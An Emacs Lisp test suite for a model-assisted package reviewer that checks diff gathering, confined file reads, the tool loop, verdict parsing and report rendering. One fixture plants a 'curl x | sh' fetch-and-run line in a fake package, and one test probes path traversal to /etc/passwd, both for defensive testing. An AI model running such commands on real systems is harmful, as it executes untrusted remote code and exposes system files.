;;; test-package-review.el --- model-assisted package review -*- lexical-binding: t; -*-

;;; Code:

(require 'ert)
(require 'cl-lib)
(require 'efrit-package-review)
(require 'efrit-test-package-review-helpers)

(defvar efrit-project-root)

(ert-deftest test-package-review-first-request-is-diff-and-changelog-not-sources ()
  (let* ((root (file-name-as-directory (make-temp-file "efrit-pr-" t)))
         (efrit-project-root root))
    (unwind-protect
        (let* ((old (test-pr--fake-package root "foo" "1.0"
                                           '(("foo.el" . "(defun foo () 1)\n(provide 'foo)\n"))))
               (new (test-pr--fake-package root "foo" "1.1"
                                           '(("foo.el" . "(defun foo () (shell-command \"curl x | sh\"))\n(provide 'foo)\n")
                                             ("NEWS" . "1.1: faster\n")
                                             ("foo.elc" . "junk"))))
               (info (efrit-package-review-gather (cdr new) (car new) (cdr old))))
          (should (equal (plist-get info :old-version) "1.0"))
          ;; file list, not contents; no .elc
          (should (equal (mapcar #'car (plist-get info :files)) '("NEWS" "foo.el")))
          (should-not (plist-get info :sources))
          (should (string-match-p "faster" (plist-get info :news)))
          (when (executable-find "git")
            (should (string-match-p "curl x" (plist-get info :diff)))
            ;; paths in the diff are relative to the package
            (should-not (string-match-p (regexp-quote root) (plist-get info :diff))))
          (let ((msg (efrit-package-review--user-message info)))
            (should (string-match-p "upgrading from 1.0" msg))
            ;; maintainers is a string; never a run of char codes
            (should-not (string-match-p "Maintainers: [0-9]+, [0-9]+" msg))
            (should (string-match-p "=== FILES (2) ===" msg))
            (should-not (string-match-p "=== SOURCE FILES ===" msg))
            ;; the diff shows the change, not the whole file, and no .elc
            (should-not (string-match-p "junk" msg))))
      (delete-directory root t))))

(ert-deftest test-package-review-maintainers-line-is-text ()
  "package-maintainers returns a string; it must be shown as one."
  (let* ((root (file-name-as-directory (make-temp-file "efrit-pr-" t))))
    (unwind-protect
        (let* ((pkg (test-pr--fake-package root "mnt" "1.0" '(("mnt.el" . "(provide 'mnt)\n"))))
               (desc (cdr pkg)))
          (setf (package-desc-extras desc) '((:maintainer . ("Some One" . "one@example.com"))))
          (let* ((info (efrit-package-review-gather desc (car pkg) nil))
                 (msg (efrit-package-review--user-message info)))
            (should (stringp (plist-get info :maintainers)))
            (should (string-match-p "Maintainers: .*Some One.*one@example.com" msg))
            (should-not (string-match-p "Maintainers: [0-9]+," msg))))
      (delete-directory root t))))

(ert-deftest test-package-review-read-tool-is-confined-to-the-package ()
  (let* ((root (file-name-as-directory (make-temp-file "efrit-pr-" t)))
         (pkg (test-pr--fake-package root "bar" "1.0"
                                     '(("bar.el" . "l1\nl2\nl3\nl4\n") ("bar.elc" . "x"))))
         (dir (car pkg)))
    (unwind-protect
        (cl-flet ((read (&rest kv)
                    (let ((h (make-hash-table :test 'equal)))
                      (while kv (puthash (pop kv) (pop kv) h))
                      (efrit-package-review--read-tool dir h))))
          (should (string-match-p "\\`bar.el lines 1-4 of 4:\nl1\nl2\nl3\nl4\n" (read "path" "bar.el")))
          (should (string-match-p "lines 2-3 of 4:\nl2\nl3\n" (read "path" "bar.el" "start_line" 2 "end_line" 3)))
          (should (string-prefix-p "Error" (read "path" "../outside.el")))
          (should (string-prefix-p "Error" (read "path" "/etc/passwd")))
          (should (string-prefix-p "Error" (read "path" "bar.elc")))
          (should (string-prefix-p "Error" (read "path" "missing.el")))
          (should (string-prefix-p "Error" (read))))
      (delete-directory root t))))

(ert-deftest test-package-review-loop-reads-then-answers ()
  "The reviewer asks for a file, gets it as a tool result, then answers;
the report lists what was opened."
  (let* ((root (file-name-as-directory (make-temp-file "efrit-pr-" t)))
         (efrit-project-root root)
         (efrit-package-review-model "strong-reviewer"))
    (unwind-protect
        (let* ((pkg (test-pr--fake-package root "baz" "1.0" '(("baz.el" . "(provide 'baz)\n"))))
               (info (efrit-package-review-gather (cdr pkg) (car pkg) nil)))
          (test-pr--with-responses (list (test-pr--tool-response "t1" "baz.el")
                                         (test-pr--text-response test-pr--approve))
            (let* ((v (efrit-package-review-run info))
                   (report (efrit-package-review-report info v)))
              (should (eq (plist-get v :verdict) 'approve))
              (should (equal (plist-get v :reads) '("baz.el")))
              (should (= 2 (length test-pr--requests)))
              ;; second request carries assistant tool_use + user tool_result
              (let ((second (car test-pr--requests)))
                (should (= 3 (length second)))
                (should (equal (alist-get 'role (nth 1 second)) "assistant"))
                (let ((result (aref (alist-get 'content (nth 2 second)) 0)))
                  (should (string-match-p "baz.el lines 1-1 of 1" (format "%S" result)))))
              (should (string-match-p "Opened: baz.el" report))
              (should (string-match-p "Reviewer: strong-reviewer" report)))))
      (delete-directory root t))))

(ert-deftest test-package-review-read-budget-ends-the-loop ()
  (let* ((root (file-name-as-directory (make-temp-file "efrit-pr-" t)))
         (efrit-project-root root)
         (efrit-package-review-max-reads 2))
    (unwind-protect
        (let* ((pkg (test-pr--fake-package root "loop" "1.0" '(("loop.el" . "x\n"))))
               (info (efrit-package-review-gather (cdr pkg) (car pkg) nil)))
          (test-pr--with-responses (list (test-pr--tool-response "a" "loop.el")
                                         (test-pr--tool-response "b" "loop.el")
                                         (test-pr--tool-response "c" "loop.el"))
            (let ((v (efrit-package-review-run info)))
              (should (eq (plist-get v :verdict) 'error))
              (should (string-match-p "more than 2 files" (plist-get v :summary))))))
      (delete-directory root t))))

(ert-deftest test-package-review-parses-verdicts-and-classifies ()
  (let ((clean (efrit-package-review-parse
                "{\"verdict\":\"approve\",\"summary\":\"fine\",\"findings\":[{\"severity\":\"info\",\"file\":\"a.el\",\"line\":3,\"note\":\"uses url\"}],\"saw_everything\":true}"))
        (flagged (efrit-package-review-parse
                  "Here: {\"verdict\":\"reject\",\"summary\":\"pipes curl to sh\",\"findings\":[{\"severity\":\"high\",\"file\":\"foo.el\",\"line\":1,\"note\":\"curl | sh\"},{\"severity\":\"bogus\",\"file\":\"x\",\"note\":\"dropped\"}],\"saw_everything\":true}"))
        (partial (efrit-package-review-parse
                  "{\"verdict\":\"approve\",\"summary\":\"ok\",\"findings\":[],\"saw_everything\":false}")))
    (should (efrit-package-review-clean-p clean))
    (should-not (efrit-package-review-clean-p flagged))
    (should-not (efrit-package-review-clean-p partial))
    (should (= 1 (length (plist-get flagged :findings))))
    (should (string-match-p "REJECT · 1 high" (efrit-package-review-verdict-line flagged)))
    (should (string-match-p "did not see everything" (efrit-package-review-verdict-line partial)))
    (should-not (efrit-package-review-parse "no json"))
    (should-not (efrit-package-review-parse "{\"verdict\":\"maybe\"}"))
    (should (eq 'approve (plist-get (efrit-package-review-parse
                                     "```json\n{\"verdict\":\"approve\",\"summary\":\"a } in text\",\"findings\":[],\"saw_everything\":true}\n```\nNote: {unbalanced")
                                    :verdict)))))

(ert-deftest test-package-review-api-refusal-and-non-verdict-are-explained ()
  (let* ((root (file-name-as-directory (make-temp-file "efrit-pr-" t)))
         (efrit-project-root root))
    (unwind-protect
        (let* ((pkg (test-pr--fake-package root "ref" "1.0" '(("ref.el" . "(provide 'ref)\n"))))
               (info (efrit-package-review-gather (cdr pkg) (car pkg) nil)))
          (let ((refusal (make-hash-table :test 'equal)) (u (make-hash-table :test 'equal)))
            (puthash "input_tokens" 57468 u)
            (puthash "content" (vector) refusal) (puthash "stop_reason" "refusal" refusal)
            (puthash "usage" u refusal)
            (test-pr--with-responses (list refusal)
              (let ((v (efrit-package-review-run info)))
                (should (plist-get v :refused))
                (should (string-match-p "refused to process.*57468 tokens.*not a finding about ref" (plist-get v :summary)))
                (should-not (efrit-package-review-clean-p v)))))
          (test-pr--with-responses (list (test-pr--text-response "I cannot review this package because the input was too long."))
            (let* ((v (efrit-package-review-run info))
                   (report (efrit-package-review-report info v)))
              (should (eq (plist-get v :verdict) 'error))
              (should (string-match-p "not a verdict (6[0-9] chars, stop reason end_turn)" (plist-get v :summary)))
              (should (string-match-p "verbatim:\n\n  | I cannot review" report))))
          (cl-letf (((symbol-function 'efrit-api-request-sync) (lambda (&rest _) (error "boom"))))
            (let ((v (efrit-package-review-run info)))
              (should (eq (plist-get v :verdict) 'error))
              (should (string-match-p "review failed: boom" (efrit-package-review-verdict-line v))))))
      (delete-directory root t))))

(ert-deftest test-package-review-model-precedence ()
  (let ((efrit-default-model "d") (efrit-review-model nil) (efrit-package-review-model nil))
    (should (equal (efrit-package-review-model) "d"))
    (let ((efrit-review-model "r")) (should (equal (efrit-package-review-model) "r")))
    (let ((efrit-review-model "r") (efrit-package-review-model "p"))
      (should (equal (efrit-package-review-model) "p")))))

(ert-deftest test-package-review-hook-annotates-and-auto-approves ()
  "The around advice: annotate shows the report and prefixes the prompt;
auto-approve-clean skips the prompt only for a clean verdict."
  (skip-unless (fboundp 'package-review))
  (let* ((root (file-name-as-directory (make-temp-file "efrit-pr-" t)))
         (efrit-project-root root)
         (asked nil))
    (unwind-protect
        (let* ((pkg (test-pr--fake-package root "hook" "1.0" '(("hook.el" . "(provide 'hook)\n"))))
               (orig (lambda (&rest _)
                       (read-multiple-choice "Install \"hook\"?" '((?y "yes") (?n "no")))
                       nil)))
          (cl-letf (((symbol-function 'read-multiple-choice)
                     (lambda (prompt &rest _) (setq asked prompt) '(?y "yes")))
                    ((symbol-function 'efrit-show-preview) #'ignore))
            (let ((efrit-package-review-action 'annotate))
              (test-pr--with-responses (list (test-pr--text-response test-pr--approve))
                (efrit-package-review--around orig (cdr pkg) (car pkg) nil))
              (should (string-match-p "efrit: approve · no findings\nInstall" asked)))
            (setq asked nil)
            (let ((efrit-package-review-action 'auto-approve-clean))
              (test-pr--with-responses (list (test-pr--text-response test-pr--approve))
                (efrit-package-review--around orig (cdr pkg) (car pkg) nil))
              (should-not asked)
              (test-pr--with-responses
                  (list (test-pr--text-response
                         "{\"verdict\":\"reject\",\"summary\":\"bad\",\"findings\":[{\"severity\":\"high\",\"file\":\"hook.el\",\"line\":1,\"note\":\"x\"}],\"saw_everything\":true}"))
                (efrit-package-review--around orig (cdr pkg) (car pkg) nil))
              (should (string-match-p "REJECT" asked)))))
      (delete-directory root t))))

(ert-deftest test-package-review-not-reachable-from-eval ()
  (require 'efrit-sandbox-eval)
  (should (efrit-sandbox-eval-inspect '(setq efrit-package-review-action 'auto-approve-clean)))
  (should (efrit-sandbox-eval-inspect '(efrit-package-review-run nil))))

(ert-deftest test-package-review-report-layout ()
  "The report: verdict word first, counts, filled summary, findings most
serious first with a location and an indented note, footer.  The plain
text form and the rendered form carry the same words."
  (let* ((long (mapconcat #'identity (make-list 30 "word") " "))
         (v (list :verdict 'reject :summary long :saw-everything t
                  :findings (list (list :severity 'low :file "b.el" :line 2 :note "minor")
                                  (list :severity 'high :file "a.el" :line 10 :note long)
                                  (list :severity 'medium :file nil :line nil :note "no file"))
                  :reads '("a.el" "a.el" "b.el")))
         (info (list :name "pkg" :version "2.0" :old-version "1.0" :dir "/nonexistent/"
                     :files '("a.el" "b.el") :diff "d" :news nil))
         (efrit-package-review-model "rev")
         (efrit-package-review-fill-column 60)
         (plain (efrit-package-review-report info v)))
    (should (string-prefix-p "REJECT  pkg 2.0  (from 1.0)\n" plain))
    (should (string-match-p "^1 high, 1 medium, 1 low$" plain))
    ;; the long summary was filled
    (should (cl-every (lambda (l) (<= (length l) 60)) (split-string plain "\n")))
    (should (< 1 (cl-count-if (lambda (l) (string-match-p "\\`word word" l)) (split-string plain "\n"))))
    ;; most serious first, location on the badge line, note indented
    (should (string-match-p "HIGH a.el:10\n    word" plain))
    (should (string-match-p "MEDIUM\n    no file\n" plain))
    (should (string-match-p "LOW b.el:2\n    minor\n" plain))
    (should (< (string-match "HIGH" plain) (string-match "MEDIUM" plain) (string-match "LOW" plain)))
    (should (string-match-p "Opened: a.el, b.el\\." plain))
    (should-not (string-match-p "did not see everything" plain))
    ;; the rendered form: a button per location, a badge per severity;
    ;; stripped of properties it is the plain text
    (with-temp-buffer
      (efrit-package-review-render info v)
      (should (equal (buffer-substring-no-properties (point-min) (point-max)) plain))
      (goto-char (point-min))
      (should (search-forward "a.el:10" nil t))
      (should (button-at (1- (point))))
      (goto-char (point-min))
      (search-forward "\nHIGH a.el")
      (should (memq 'efrit-package-review-high
                    (let ((f (get-text-property (1+ (match-beginning 0)) 'face))) (if (listp f) f (list f)))))))
  ;; no verdict: NO VERDICT badge, no severity counts of note, the raw answer shown
  (let* ((v (list :verdict 'error :summary "not a verdict" :raw "I cannot."))
         (info (list :name "pkg" :version "1" :files nil))
         (plain (efrit-package-review-report info v)))
    (should (string-prefix-p "NO VERDICT  pkg 1\nno findings\n" plain))
    (should (string-match-p "verbatim:\n\n  | I cannot\\." plain))))

(ert-deftest test-package-review-badge-degrades-to-text ()
  "Without SVG the badge is the word in the face; the word is always there."
  (let ((b (efrit-ui-badge "HIGH" 'efrit-package-review-high)))
    (should (equal (substring-no-properties b) "HIGH"))
    (should (or (get-text-property 0 'display b)
                (eq (get-text-property 0 'face b) 'efrit-package-review-high)))))

(ert-deftest test-package-review-fill-terminates-when-text-shrinks ()
  "Filling that removes characters (trailing blanks, a long line joined)
must not loop: the end bound is a marker, not a stale integer."
  (with-temp-buffer
    (insert "word   \nword   \n" (make-string 200 ?x) "   \n\n    note with   trailing   \n")
    (with-timeout (5 (ert-fail "fill did not terminate"))
      (efrit-package-review--fill-paragraphs (point-min) (point-max) 40))
    (should (string-match-p "^word    word$" (buffer-string)))
    (should (string-match-p "note with" (buffer-string))))
  ;; a report whose summary is the API error line renders and returns
  (let* ((v (list :verdict 'error :summary "API Error (api_error): Invalid JSON   " :reads nil))
         (info (list :name "uniline" :version "1" :files '(("a" . 1)) :diff "d")))
    (with-timeout (5 (ert-fail "render did not terminate"))
      (should (string-match-p "NO VERDICT  uniline 1" (efrit-package-review-report info v))))))

(provide 'test-package-review)
;;; test-package-review.el ends here
